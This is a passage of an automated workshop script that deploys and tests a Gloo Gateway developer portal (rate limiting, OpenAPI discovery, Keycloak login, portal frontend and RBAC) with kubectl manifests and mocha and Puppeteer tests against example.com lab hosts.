spec:
  raw:
    setDescriptors:
      - simpleDescriptors:
          - key: userId
        rateLimit:
          requestsPerUnit: 5
          unit: MINUTE
    rateLimits:
      - setActions:
        - metadata:
            descriptorKey: userId
            metadataKey:
              key: envoy.filters.http.ext_authz
              path:
                - key: userId
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption-apis
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: bookinfo
  options:
    # ExtAuth configuration
    extauth:
      configRef:
        name: apis
        namespace: gloo-system
    cors:
      allowCredentials: true
      allowHeaders:
      - "*"
      allowMethods:
      - GET
      allowOriginRegex:
      - ".*"
    # Rate limit configuration
    rateLimitConfigs:
      refs:
      - name: limit-apis
        namespace: gloo-system
EOF
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API rate limited", () => {
  it('Response code is 429', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], retCode: 429 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-rate-limited.test.js.liquid from lab number 26"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
kubectl --context ${CLUSTER1} -n bookinfo annotate service productpage gloo.solo.io/scrape-openapi-source=https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/swagger.yaml --overwrite
kubectl --context ${CLUSTER1} -n bookinfo annotate service productpage gloo.solo.io/scrape-openapi-pull-attempts="3" --overwrite
kubectl --context ${CLUSTER1} -n bookinfo annotate service productpage gloo.solo.io/scrape-openapi-retry-delay=5s --overwrite
kubectl --context ${CLUSTER1} -n bookinfo annotate service productpage gloo.solo.io/scrape-openapi-use-backoff="true" --overwrite
echo Waiting for APIDoc to be created...
timeout -v 5m bash -c "until [[ \$(kubectl --context ${CLUSTER1} -n bookinfo get apidoc productpage-service) ]]; do
  kubectl --context ${CLUSTER1} -n bookinfo rollout restart deploy productpage-v1
  kubectl --context ${CLUSTER1} -n bookinfo rollout status deploy productpage-v1
  sleep 1
done"
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("APIDoc has been created", () => {
    it('APIDoc is present', () => helpers.k8sObjectIsPresent({ context: process.env.CLUSTER1, namespace: "bookinfo", k8sType: "apidoc", k8sObj: "productpage-service" }));
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/apidoc-created.test.js.liquid from lab number 26"
timeout --signal=INT 5m mocha ./test.js --timeout 10000 --retries=300 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: portal.gloo.solo.io/v1
kind: ApiProduct
metadata:
  name: bookinfo-api
  namespace: bookinfo
spec:
  id: bookinfo
  displayName: BookInfo REST API
  customMetadata:
    imageURL: https://raw.githubusercontent.com/solo-io/workshops/master/images/bookinfo.jpg
  versions:
    - apiVersion: v1
      targetRefs:
      - group: gateway.networking.k8s.io
        kind: HTTPRoute
        name: productpage-api-v1
        namespace: bookinfo
      openapiMetadata:
        title: BookInfo REST API v1
        description: |
          # Bookinfo REST API v1 Documentation
          This is some extra information about the API
      customMetadata:
        lifecyclePhase: General Availability
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: portal.gloo.solo.io/v1
kind: Portal
metadata:
  name: portal
  namespace: gloo-system
spec:
  # APIs will be accessible to unauthenticated users
  visibility:
    public: true
  # List of API products to be included in the portal
  apiProducts:
    - namespace: bookinfo
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1beta1
kind: ReferenceGrant
metadata:
  name: allow-portal-to-access-apiproduct
  namespace: bookinfo
spec:
  # Allow the portal server to reference APIProducts in other namespaces
  from:
    - group: portal.gloo.solo.io
      kind: Portal
      namespace: gloo-system
  to:
    - group: portal.gloo.solo.io
      kind: ApiProduct
EOF
kubectl --context ${CLUSTER1} -n gloo-system delete ratelimitconfig limit-apis
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption-apis
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: bookinfo
  options:
    # ExtAuth configuration
    extauth:
      configRef:
        name: apis
        namespace: gloo-system
    cors:
      allowCredentials: true
      allowHeaders:
      - "*"
      allowMethods:
      - GET
      allowOriginRegex:
      - ".*"
EOF
PROXY_IP=$(kubectl --context ${CLUSTER1} -n gloo-system get svc gloo-proxy-http -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')
cat <<'EOF' > ./test.js
const dns = require('dns');
const chaiHttp = require("chai-http");
const chai = require("chai");
const expect = chai.expect;
chai.use(chaiHttp);
const { waitOnFailedTest } = require('./tests/utils');

afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});

describe("ExternalDNS dns entry validation", () => {
    it('bookinfo.example.com resolves to ' + process.env.PROXY_IP + ' by the local test DNS server ' + process.env.BIND_CONTAINER_IP, (done) => {
        dns.setServers([ process.env.BIND_CONTAINER_IP ]);
        return dns.resolve('bookinfo.example.com', (error, address) => {
            if (!error) {
                expect(address.toString()).to.be.eq(process.env.PROXY_IP);
            }
            done(error);
        });
    });
});

EOF
echo "executing test ./default/tests/external-dns.test.js.liquid from lab number 26"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=50 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gloo.solo.io/v1
kind: Upstream
metadata:
  name: openlibrary
  namespace: bookinfo
spec:
  static:
    hosts:
      - addr: static.is.solo.io
        port: 443
  sslConfig: {}
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: portal.gloo.solo.io/v1
kind: ApiSchemaDiscovery
metadata:
  name: openlibrary
  namespace: bookinfo
spec:
  # Fetch the OpenAPI schema from the Open Library API
  openapi:
    fetchEndpoint:
      url: "https://raw.githubusercontent.com/internetarchive/openlibrary/refs/heads/master/static/openapi.json"
  servedBy:
  - targetRef:
      kind: UPSTREAM
      name: openlibrary
      namespace: bookinfo
    port: 443
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: productpage-api-v2
  namespace: bookinfo
  annotations:
    delegation.gateway.solo.io/inherit-parent-matcher: "true"
spec:
  rules:
    # If the request path starts with /v2/search.json
    # Rewrite to /search.json and route to the openlibrary upstream
    - matches:
      - path:
          type: PathPrefix
          value: /v2/search.json
      backendRefs:
        - group: gloo.solo.io
          kind: Upstream
          name: openlibrary
          port: 443
      filters:
        - type: URLRewrite
          urlRewrite:
            hostname: static.is.solo.io
            path:
              type: ReplacePrefixMatch
              replacePrefixMatch: /search.json
    # If the request path starts with /v2/authors/{author}.json
    # Apply regex rewrite and route to the openlibrary upstream
    - matches:
      - path:
          type: RegularExpression
          value: /v2/authors/([^.]+).json
      backendRefs:
        - group: gloo.solo.io
          kind: Upstream
          name: openlibrary
          port: 443
      filters:
        - type: URLRewrite
          urlRewrite:
            hostname: static.is.solo.io
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: regex-rewrite
    # If the request path starts with /v2
    # Rewrite to /api/v1/products and route to the productpage service
    - matches:
      - path:
          type: PathPrefix
          value: /v2
      backendRefs:
        - name: productpage
          port: 9080
      filters:
        - type: URLRewrite
          urlRewrite:
            path:
              type: ReplacePrefixMatch
              replacePrefixMatch: /api/v1/products
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: regex-rewrite
  namespace: bookinfo
spec:
  options:
    regexRewrite:
      # rewrite /api/bookinfo/v2/authors/{author}.json to /authors/{author}.json
      pattern:
        regex: /api/bookinfo/v2/authors/([^.]+).json
      substitution: /authors/\1.json
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the openlibrary API", () => {
  it('Checking text \'language\' in the response', () => helpersHttp.checkBody({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v2/search.json?title=The%20Comedy%20of%20Errors&fields=language&limit=1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], body: 'language', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-stitching/tests/access-openlibrary-api.test.js.liquid from lab number 27"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 27"; exit 1; }
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the openlibrary API with regex", () => {
  it('Checking text \'Rowling\' in the response', () => helpersHttp.checkBody({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v2/authors/OL23919A.json', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], body: 'Rowling', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-stitching/tests/access-openlibrary-api-regex.test.js.liquid from lab number 27"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 27"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: portal.gloo.solo.io/v1
kind: ApiProduct
metadata:
  name: bookinfo-api
  namespace: bookinfo
spec:
  id: bookinfo
  displayName: BookInfo REST API
  customMetadata:
    imageURL: https://raw.githubusercontent.com/solo-io/workshops/master/images/bookinfo.jpg
  versions:
    - apiVersion: v1
      targetRefs:
      - group: gateway.networking.k8s.io
        kind: HTTPRoute
        name: productpage-api-v1
        namespace: bookinfo
      openapiMetadata:
        title: BookInfo REST API v1
        description: |
          # Bookinfo REST API v1 Documentation
          This is some extra information about the API
      customMetadata:
        lifecyclePhase: Deprecated
    - apiVersion: v2
      targetRefs:
      - group: gateway.networking.k8s.io
        kind: HTTPRoute
        name: productpage-api-v2
        namespace: bookinfo
      openapiMetadata:
        title: BookInfo REST API v2
        description: |
          # Bookinfo REST API v1 Documentation
          You can find more information about the openlibrary API [here](https://openlibrary.org/developers/api)
      customMetadata:
        lifecyclePhase: General Availability
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: portal
  namespace: gloo-system
spec:
  configs:
    - oauth2:
        oidcAuthorizationCode:
          appUrl: "https://portal.example.com"
          callbackPath: /v1/login
          clientId: ${KEYCLOAK_CLIENT}
          clientSecretRef:
            name: oauth
            namespace: gloo-system
          issuerUrl: "${KEYCLOAK_URL}/realms/workshop/"
          logoutPath: /v1/logout
          session:
            failOnFetchFailure: true
            redis:
              cookieName: keycloak-session
              options:
                host: redis:6379
          scopes:
          - email
          headers:
            idTokenHeader: id_token
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption-portal-api
  namespace: gloo-system
spec:
  options:
    extauth:
      configRef:
        name: portal
        namespace: gloo-system
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: portal-server
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https
  hostnames:
    - "portal.example.com"
    - gateway-portal-web-server.gloo-system
  rules:
    - backendRefs:
        - name: gateway-portal-web-server
          port: 8080
      matches:
      - path:
          type: PathPrefix
          value: /v1
        headers:
        - name: Authorization
          type: RegularExpression
          value: Bearer\s.*
      filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: routeoption-apis
    - backendRefs:
        - name: gateway-portal-web-server
          port: 8080
      matches:
      - path:
          type: PathPrefix
          value: /v1
        headers:
          - name: Cookie
            type: RegularExpression
            value: ".*?keycloak-session=.*"
      filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: routeoption-portal-api
    - backendRefs:
        - name: gateway-portal-web-server
          port: 8080
      matches:
      - path:
          type: PathPrefix
          value: /v1
EOF
./scripts/register-domain.sh portal.example.com ${PROXY_IP}
cat <<'EOF' > ./test.js
const dns = require('dns');
const chaiHttp = require("chai-http");
const chai = require("chai");
const expect = chai.expect;
chai.use(chaiHttp);
const { waitOnFailedTest } = require('./tests/utils');

afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});

describe("ExternalDNS dns entry validation", () => {
    it('portal.example.com resolves to ' + process.env.PROXY_IP + ' by the local test DNS server ' + process.env.BIND_CONTAINER_IP, (done) => {
        dns.setServers([ process.env.BIND_CONTAINER_IP ]);
        return dns.resolve('portal.example.com', (error, address) => {
            if (!error) {
                expect(address.toString()).to.be.eq(process.env.PROXY_IP);
            }
            done(error);
        });
    });
});

EOF
echo "executing test ./default/tests/external-dns.test.js.liquid from lab number 28"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=50 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 28"; exit 1; }
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the portal API without authentication", () => {
  it('Checking text \'apiProductMetadata\' in the response', () => helpersHttp.checkBody({ host: `https://portal.example.com`, path: '/v1/api-products', body: 'apiProductMetadata', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-backend/tests/access-portal-api-no-auth.test.js.liquid from lab number 28"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 28"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: portal-frontend
  namespace: gloo-system
---
apiVersion: v1
kind: Service
metadata:
  name: portal-frontend
  namespace: gloo-system
  labels:
    app: portal-frontend
    service: portal-frontend
spec:
  ports:
  - name: http
    port: 4000
    targetPort: 4000
  selector:
    app: portal-frontend
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: portal-frontend
  namespace: gloo-system
spec:
  replicas: 1
  selector:
    matchLabels:
      app: portal-frontend
  template:
    metadata:
      labels:
        app: portal-frontend
    spec:
      serviceAccountName: portal-frontend
      containers:
      - image: gcr.io/solo-public/docs/portal-frontend:v0.1.1
        args: ["--host", "0.0.0.0"]
        imagePullPolicy: Always
        name: portal-frontend
        ports:
        - containerPort: 4000
        readinessProbe:
          httpGet:
            path: /login
            port: 4000
        env:
        - name: VITE_PORTAL_SERVER_URL
          value: "https://portal.example.com/v1"
        - name: VITE_APPLIED_OIDC_AUTH_CODE_CONFIG
          value: "true"
        - name: VITE_OIDC_AUTH_CODE_CONFIG_CALLBACK_PATH
          value: "/v1/login"
        - name: VITE_OIDC_AUTH_CODE_CONFIG_LOGOUT_PATH
          value: "/v1/logout"
EOF
kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy portal-frontend
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: portal-frontend
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https
  hostnames:
    - "portal.example.com"
    - gateway-portal-web-server.gloo-system
  rules:
    - backendRefs:
        - name: portal-frontend
          port: 4000
      matches:
      - path:
          type: PathPrefix
          value: /v1/login
      - path:
          type: PathPrefix
          value: /v1/logout
      filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: routeoption-portal-api
    - backendRefs:
        - name: portal-frontend
          port: 4000
      matches:
      - path:
          type: PathPrefix
          value: /
EOF
ATTEMPTS=1
timeout 120 bash -c 'while [[ "$(curl -m 2 --max-time 2 --insecure -s -o /dev/null -w ''%{http_code}'' https://portal.example.com/v1/login)" != "302" ]]; do sleep 5; done'
timeout 120 bash -c 'while [[ "$(curl -m 2 --max-time 2 --insecure -s -o /dev/null -w ''%{http_code}'' https://portal.example.com)" != "200" ]]; do sleep 5; done'
export USER1_COOKIE=$(node tests/keycloak-token.js "https://portal.example.com/v1/login" user1)
export USER2_COOKIE=$(node tests/keycloak-token.js "https://portal.example.com/v1/login" user2)
ATTEMPTS=1
until ([ ! -z "$USER2_COOKIE" ] && [[ $USER2_COOKIE != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 3
  export USER2_COOKIE=$(node tests/keycloak-token.js "https://portal.example.com/v1/login" user2)
done
ATTEMPTS=1
until ([ ! -z "$USER1_COOKIE" ] && [[ $USER1_COOKIE != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 3
  export USER1_COOKIE=$(node tests/keycloak-token.js "https://portal.example.com/v1/login" user1)
done
echo "User1 token: $USER1_COOKIE"
echo "User2 token: $USER2_COOKIE"

# The user must be created (in the database) in 1.18
curl -k -H "Cookie: ${USER1_COOKIE}" -X PUT "https://portal.example.com/v1/me"
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the portal frontend with authentication", () => {
  const cookieString = process.env.USER1_COOKIE;

  it('Checking text \'apiProductMetadata\' in the response', () => helpersHttp.checkBody({ host: `https://portal.example.com`, path: '/v1/api-products', headers: [{ key: 'Cookie', value: cookieString }], body: 'apiProductMetadata', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/access-portal-api-auth.test.js.liquid from lab number 29"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 29"; exit 1; }
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Authentication is working properly", function() {
  const cookieString = process.env.USER1_COOKIE;

  it("The portal frontend isn't accessible without authenticating", () => {
    return helpersHttp.checkURL({ host: `https://portal.example.com`, path: '/v1/login', retCode: 302 });
  });

  it("The portal frontend is accessible after authenticating", () => {
    return helpersHttp.checkURL({ host: `https://portal.example.com`, path: '/v1/login', headers: [{ key: 'Cookie', value: cookieString }], retCode: 200 });
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/access-portal-frontend-authenticated.test.js.liquid from lab number 29"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 29"; exit 1; }
cat <<'EOF' > ./test.js
const DeveloperPortalHomePage = require('./tests/pages/dev-portal/home-page');
const DeveloperPortalAPIPage = require('./tests/pages/dev-portal/api-page');
const KeycloakSignInPage = require('./tests/pages/keycloak-sign-in-page');
const puppeteer = require('puppeteer-extra');
puppeteer.use(require('puppeteer-extra-plugin-user-preferences')({
    userPrefs: {
        safebrowsing: {
            enabled: false,
            enhanced: false
        }
    }
}));
const { enhanceBrowser } = require('./tests/utils/enhance-browser');
var chai = require('chai');
var expect = chai.expect;

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 4000);
  } else {
    done();
  }
});

describe("Dev portal frontend UI", function () {
  // UI tests often require a longer timeout.
  // So here we force it to a minimum of 30 seconds.
  const currentTimeout = this.timeout();
  this.timeout(Math.max(currentTimeout, 30000));

  let browser;
  let devPortalHomePage;
  let devPortalAPIPage;
  let keycloakSignInPage;

  // Use Mocha's 'before' hook to set up Puppeteer
  before(async function () {
    browser = await puppeteer.launch({
      headless: "new",
      slowMo: 10,
      ignoreHTTPSErrors: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    });
    browser = enhanceBrowser(browser, this.currentTest.title);
    let page = await browser.newPage();
    await page.setViewport({ width: 1500, height: 1000 });
    devPortalHomePage = new DeveloperPortalHomePage(page);
    devPortalAPIPage = new DeveloperPortalAPIPage(page);
    keycloakSignInPage = new KeycloakSignInPage(page);
  });

  it("user1 should authenticate with keycloak", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("user1", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("user1");
  });

  it("user1 should see API Products", async () => {
    await devPortalAPIPage.navigateTo(`https://portal.example.com/apis`);
    const apiProducts = await devPortalAPIPage.getAPIProducts();
    expect(apiProducts.some(item => item.includes("BookInfo"))).to.be.true;
  });

  // Use Mocha's 'after' hook to close Puppeteer
  after(async function () {
    await browser.close();
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/dev-portal-ui-tests.test.js.liquid from lab number 29"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 29"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: portal.gloo.solo.io/v1
kind: PortalGroup
metadata:
  name: rbac
  namespace: gloo-system
spec:
  membership:
    - claimGroup:
        - key: subscription
          value: enterprise
  apiProducts:
    - name: "*"
      namespace: bookinfo
EOF
cat <<'EOF' > ./test.js
const DeveloperPortalHomePage = require('./tests/pages/dev-portal/home-page');
const DeveloperPortalAPIPage = require('./tests/pages/dev-portal/api-page');
const KeycloakSignInPage = require('./tests/pages/keycloak-sign-in-page');
const puppeteer = require('puppeteer-extra');
puppeteer.use(require('puppeteer-extra-plugin-user-preferences')({
    userPrefs: {
        safebrowsing: {
            enabled: false,
            enhanced: false
        }
    }
}));
const { enhanceBrowser } = require('./tests/utils/enhance-browser');
var chai = require('chai');
var expect = chai.expect;

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 4000);
  } else {
    done();
  }
});

describe("Dev portal frontend UI", function () {
  // UI tests often require a longer timeout.
  // So here we force it to a minimum of 30 seconds.
  const currentTimeout = this.timeout();
  this.timeout(Math.max(currentTimeout, 30000));

  let browser;
  let devPortalHomePage;
  let devPortalAPIPage;
  let keycloakSignInPage;

  // Use Mocha's 'before' hook to set up Puppeteer
  before(async function () {
    browser = await puppeteer.launch({
      headless: "new",
      slowMo: 10,
      ignoreHTTPSErrors: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    });
    browser = enhanceBrowser(browser, this.currentTest.title);
    let page = await browser.newPage();
    await page.setViewport({ width: 1500, height: 1000 });
    devPortalHomePage = new DeveloperPortalHomePage(page);
    devPortalAPIPage = new DeveloperPortalAPIPage(page);
    keycloakSignInPage = new KeycloakSignInPage(page);
  });

  it("user1 should authenticate with keycloak", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("user1", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("user1");
  });

  it("user1 should see API Products", async () => {
    await devPortalAPIPage.navigateTo(`https://portal.example.com/apis`);
    const apiProducts = await devPortalAPIPage.getAPIProducts();
    expect(apiProducts.some(item => item.includes("BookInfo"))).to.be.true;
  });

   it("logout and login as user2", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com/v1/logout`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("user2", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("user2");
  });

  it("user2 shouldn't see API Products", async () => {
    await devPortalAPIPage.navigateTo(`https://portal.example.com/apis`);
    const apiProducts = await devPortalAPIPage.getAPIProducts();
    expect(apiProducts).to.have.lengthOf(0);
  });

  // Use Mocha's 'after' hook to close Puppeteer
  after(async function () {
    await browser.close();
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/dev-portal-ui-tests-rbac.test.js.liquid from lab number 29"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 29"; exit 1; }
kubectl --context ${CLUSTER1} -n gloo-system delete portalgroups.portal.gloo.solo.io rbac
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: apis
  namespace: gloo-system
spec:
  configs:
    - name: portal
      portalAuth:
        url: http://gateway-portal-web-server.gloo-system.svc.cluster.local:8080
        cacheDuration: 60s
        apiKeyHeader: "api-key"
        redisOptions:
          host: redis:6379
EOF
cat <<'EOF' > ./test.js
const DeveloperPortalHomePage = require('./tests/pages/dev-portal/home-page');
const DeveloperPortalAPIPage = require('./tests/pages/dev-portal/api-page');
const DeveloperPortalTeamsPage = require('./tests/pages/dev-portal/teams-page');
const DeveloperPortalAppsPage = require('./tests/pages/dev-portal/apps-page');
const DeveloperPortalAdminSubscriptionsPage = require('./tests/pages/dev-portal/admin-subscriptions-page');
const DeveloperPortalAdminAppsPage = require('./tests/pages/dev-portal/admin-apps-page');
const KeycloakSignInPage = require('./tests/pages/keycloak-sign-in-page');
const puppeteer = require('puppeteer-extra');
puppeteer.use(require('puppeteer-extra-plugin-user-preferences')({
    userPrefs: {
        safebrowsing: {
            enabled: false,
            enhanced: false
        }
    }
}));
const { enhanceBrowser } = require('./tests/utils/enhance-browser');
var chai = require('chai');
var expect = chai.expect;
const fs = require('fs');

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 4000);
  } else {
    done();
  }
});

describe("Dev portal frontend UI", function () {
  // UI tests often require a longer timeout.
  // So here we force it to a minimum of 30 seconds.
  const currentTimeout = this.timeout();
  this.timeout(Math.max(currentTimeout, 30000));

  let browser;
  let devPortalHomePage;
  let devPortalAPIPage;
  let devPortalTeamsPage;
  let devPortalAppsPage;
  let devPortalAdminSubscriptionsPage;
  let devPortalAdminAppsPage;
  let keycloakSignInPage;

  // Use Mocha's 'before' hook to set up Puppeteer
  before(async function () {
    browser = await puppeteer.launch({
      headless: "new",
      slowMo: 10,
      ignoreHTTPSErrors: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    });
    const context = browser.defaultBrowserContext();
    await context.overridePermissions(`https://portal.example.com`, [
      "clipboard-read",
      "clipboard-write",
      "clipboard-sanitized-write",
    ]);
    browser = enhanceBrowser(browser, this.currentTest.title);
    let page = await browser.newPage();
    await page.setViewport({ width: 1500, height: 1000 });
    devPortalHomePage = new DeveloperPortalHomePage(page);
    devPortalAPIPage = new DeveloperPortalAPIPage(page);
    devPortalTeamsPage = new DeveloperPortalTeamsPage(page);
    devPortalAppsPage = new DeveloperPortalAppsPage(page);
    devPortalAdminSubscriptionsPage = new DeveloperPortalAdminSubscriptionsPage(page);
    devPortalAdminAppsPage = new DeveloperPortalAdminAppsPage(page);
    keycloakSignInPage = new KeycloakSignInPage(page);
  });

  it("user1 should authenticate with keycloak", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("user1", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("user1");
  });

  it("user1 should see API Products", async () => {
    await devPortalAPIPage.navigateTo(`https://portal.example.com/apis`);
    const apiProducts = await devPortalAPIPage.getAPIProducts();
    expect(apiProducts.some(item => item.includes("BookInfo"))).to.be.true;
  });

  it("user1 should be able to create a Team and add user2@solo.io as a member", async () => {
    await devPortalTeamsPage.navigateTo(`https://portal.example.com/teams`);
    await devPortalTeamsPage.createTeamAndAddUser('team1', 'team1', 'user2@solo.io');
  });

  it("user1 should be able to create an Application", async () => {
    await devPortalAppsPage.navigateTo(`https://portal.example.com/apps`);
    await devPortalAppsPage.createNewApp('team1', 'app1', 'app1');
  });

  it("user1 should be able to subscribe to an API Product", async () => {
    await devPortalAppsPage.navigateTo(`https://portal.example.com/apps`);
    await devPortalAppsPage.navigateToAppDetails();
    await devPortalAppsPage.createSubscription('BookInfo REST API');
  });

  it("logout and login as admin1", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com/v1/logout`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("admin1", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("admin1");
  });

  it("admin1 should be able to approve the subscription and add metadata", async () => {
    await devPortalAdminSubscriptionsPage.navigateTo(`https://portal.example.com/admin/subscriptions`);
    await devPortalAdminSubscriptionsPage.approveSubscription();
    await devPortalAdminSubscriptionsPage.addCustomMetadata('key', 'value');
    await devPortalAdminSubscriptionsPage.setRateLimit(5, 'MINUTE');
  });

  it("admin1 should be able to add application metadata", async () => {
    await devPortalAdminAppsPage.navigateTo(`https://portal.example.com/admin/apps`);
